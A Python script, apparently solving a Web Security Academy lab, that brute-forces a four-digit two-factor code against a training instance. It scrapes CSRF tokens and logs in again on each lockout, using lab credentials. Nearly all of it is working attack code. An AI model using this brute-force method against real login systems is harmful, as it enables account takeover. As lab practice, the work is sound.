'''
OTP does not change or rotate over time. Even after countless wrong attempts, the OTP remains the same.

The web logs the user out after 2 failed OTP attempts, but when login again, the same OTP is still valid.

It does not rate limit the OTP attempts such as locking the account or delaying the response time.
'''

import requests

url = "https://0a6200cd040b818a81aae8f400cc0014.web-security-academy.net:443"
burp0_headers = {"Accept-Language": "en-US,en;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Sec-Ch-Ua": "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Referer": "https://0a6200cd040b818a81aae8f400cc0014.web-security-academy.net/", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}

username="carlos"
password="montoya"

session = requests.Session()

otp_idx = 0

def retrieve_csrf_token(response): # Must be a valid HTML response containing csrf token
    token_start = response.text.find('name="csrf" value="') + len('name="csrf" value="')
    token_end = response.text.find('"', token_start)
    csrf_token = response.text[token_start:token_end]
    return csrf_token

def get_login_csrf_token():
    print("[*] Gets the login page html")
    response = session.get(f"{url}/login", headers=burp0_headers)
    login_csrf_token = retrieve_csrf_token(response)
    print(f"[+] Extract CSRF token when GET /login: {login_csrf_token}")
    return login_csrf_token

def login(username, password, login_csrf_token):
    print("[*] Logging in")
    response = session.post(
        f"{url}/login",
        headers=burp0_headers,
        data={
            "csrf": login_csrf_token,
            "username": username,
            "password": password
        }
    )
    print("[+] Redirecting to /login2")
    return response

def brute_force_otp(resp):
    print("[*] Starting OTP brute-force attack")
    otp_csrf_token = retrieve_csrf_token(resp)
    print(f"[+] Extract CSRF token when GET /login2: {otp_csrf_token}")
    
    global otp_idx
    while otp_idx < 10000:
        otp_code_str = str(otp_idx).zfill(4)
        print(f"[*] Trying OTP code: {otp_code_str}")
        response = session.post(
            f"{url}/login2",
            headers=burp0_headers,
            data={
                "csrf": otp_csrf_token,
                "mfa-code": otp_code_str
            },
            cookies=session.cookies
        )
        otp_idx += 1
        
        if "Invalid CSRF token" in response.text:
            print("[-] CSRF token is invalid!")
            return "bruh"
        
        if "Incorrect security code" not in response.text:
            print(f"[+] Successful OTP code found: {otp_code_str}")
            print(response.text)
            return otp_code_str
        
    print("[-] OTP brute-force attack failed")
    return "bruh"

if __name__ == "__main__":
    while True:    
        login_csrf_token = get_login_csrf_token()
        response_text = login(username, password, login_csrf_token)
        response_text_2 = brute_force_otp(response_text)
        print(response_text_2)
